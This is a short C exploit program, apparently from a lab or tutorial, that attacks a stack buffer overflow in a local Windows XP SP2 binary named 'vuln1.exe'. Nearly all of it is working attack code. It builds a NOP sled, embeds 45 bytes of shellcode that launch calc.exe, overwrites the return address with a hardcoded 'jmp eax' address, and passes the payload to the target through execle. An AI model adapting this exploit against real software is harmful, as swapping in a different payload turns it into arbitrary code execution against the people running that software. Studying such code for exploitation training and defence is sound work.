#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BUF_SIZE 76 // vuln buffer + ebp
#define RETURN_ADD "\xC3\x2C\x82\x7C" // jmp eax
#define NOP "\x90" // No Instruction Operation

// Shellcode: Calc.exe - 45 bytes - Windows XP SP2
char shellcode[] = "\xB8\xFF\xEF\xFF\xFF\xF7\xD0\x2B"
                   "\xE0\x55\x8B\xEC\x33\xFF\x57\x83" \
                   "\xEC\x04\xC6\x45\xF8\x63\xC6\x45" \
                   "\xF9\x61\xC6\x45\xFA\x6C\xC6\x45" \
                   "\xFB\x63\x8D\x45\xF8\x50\xBB\xC7" \
                   "\x93\xBF\x77\xFF\xD3";

int main (int argc, char **argv) {
    char *cmd;
    
    cmd = (char *) malloc(BUF_SIZE + 4);
    memset(cmd, '\x90', 31); // nb of NOP = BUF_SIZE - shellcode length
    memcpy(cmd + 31, shellcode, 45);
    memcpy(cmd + BUF_SIZE, RETURN_ADD, 4);
    execle("vuln1.exe", "vuln1", cmd, NULL, NULL);
    free(cmd);
    
    return 0;
}
